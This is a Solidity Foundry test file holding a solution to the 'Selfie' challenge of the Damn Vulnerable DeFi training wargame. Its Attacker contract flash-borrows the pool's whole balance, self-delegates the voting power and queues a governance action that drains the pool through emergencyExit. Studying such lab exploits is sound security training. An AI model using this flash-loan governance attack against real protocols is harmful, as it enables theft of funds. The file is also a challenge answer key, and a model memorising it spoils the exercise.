// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(token);
        pool = new SelfiePool(token, governance);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function test_selfie() public checkSolvedByPlayer {
        // Deploy attacker contract
        Attacker attacker = new Attacker(token, governance, pool, recovery);
        // Execute the attack: flash loan + delegate + queue action
        attacker.attack();
        // Warp 2 days forward so the action can be executed
        vm.warp(block.timestamp + 2 days);
        // Execute the queued action to drain the pool
        governance.executeAction(1);
    }

    function _isSolved() private view {
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker is IERC3156FlashBorrower {
    DamnValuableVotes public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() public {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            pool.maxFlashLoan(address(token)),
            ""
        );
    }

    function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        require(initiator == address(this), "Not our loan");

        // BUG: ERC20Votes requires delegation to count votes.
        // We now hold 1.5M tokens — delegate to ourselves to get voting power.
        token.delegate(address(this));

        // Now we have 1.5M votes > 1M (half of 2M total) — enough to queue actions!
        governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(pool.emergencyExit, (recovery))
        );

        // Approve pool to pull back the flash loan
        token.approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
